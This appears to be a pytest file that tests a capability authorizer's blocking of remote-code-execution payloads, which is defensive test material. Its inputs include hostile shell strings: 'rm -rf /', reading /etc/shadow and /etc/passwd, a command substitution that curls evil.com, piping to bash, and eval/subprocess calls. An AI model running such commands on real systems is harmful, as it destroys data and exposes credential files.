# -*- coding: utf-8 -*-
"""Tests for RCE (Remote Code Execution) blocking via CapabilityAuthorizer."""

import pytest

from app.application.security.capability_authorizer import CapabilityAuthorizer

_ALLOWED = {"test_cap", "safe_cap"}


@pytest.fixture
def authorizer():
    return CapabilityAuthorizer(allowlist=_ALLOWED, require_confirmation_for=set())


class TestRceBlocking:
    """Verify that all RCE-style payloads are correctly blocked."""

    def test_shell_injection_semicolon(self, authorizer):
        """Shell injection via semicolon must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"input": "valid; rm -rf /"},
            )

    def test_shell_injection_backtick(self, authorizer):
        """Shell injection via backtick must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"cmd": "`cat /etc/shadow`"},
            )

    def test_shell_injection_subshell(self, authorizer):
        """Command substitution $(…) must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"query": "$(curl http://evil.com)"},
            )

    def test_shell_injection_pipe(self, authorizer):
        """Pipe character injection must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"arg": "hello | bash"},
            )

    def test_shell_injection_ampersand(self, authorizer):
        """Ampersand (background execution) must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"data": "payload & id"},
            )

    def test_path_traversal(self, authorizer):
        """Path traversal attempt must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"file": "../../etc/passwd"},
            )

    def test_eval_keyword_blocked(self, authorizer):
        """Payload containing 'eval' keyword must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"script": "eval('import os; os.system(\"id\")')"},
            )

    def test_subprocess_keyword_blocked(self, authorizer):
        """Payload containing 'subprocess' keyword must be rejected."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="hacker",
                capability_name="test_cap",
                payload={"code": "subprocess.run(['id'])"},
            )

    def test_nonexistent_capability_blocked(self, authorizer):
        """A capability not in the allowlist must never execute."""
        with pytest.raises(PermissionError):
            authorizer.authorize(
                user="user",
                capability_name="nonexistent_capability",
                payload={},
            )

    def test_suspicious_characters_in_url(self, authorizer):
        """Dollar sign in a field should trigger injection detection."""
        with pytest.raises(ValueError):
            authorizer.authorize(
                user="user",
                capability_name="test_cap",
                payload={"url": "https://example.com/$HOME"},
            )

    def test_clean_payload_passes(self, authorizer):
        """A completely safe payload must be authorized without issues."""
        result = authorizer.authorize(
            user="trusted_user",
            capability_name="safe_cap",
            payload={"message": "Olá mundo", "count": 3},
        )
        assert result is True
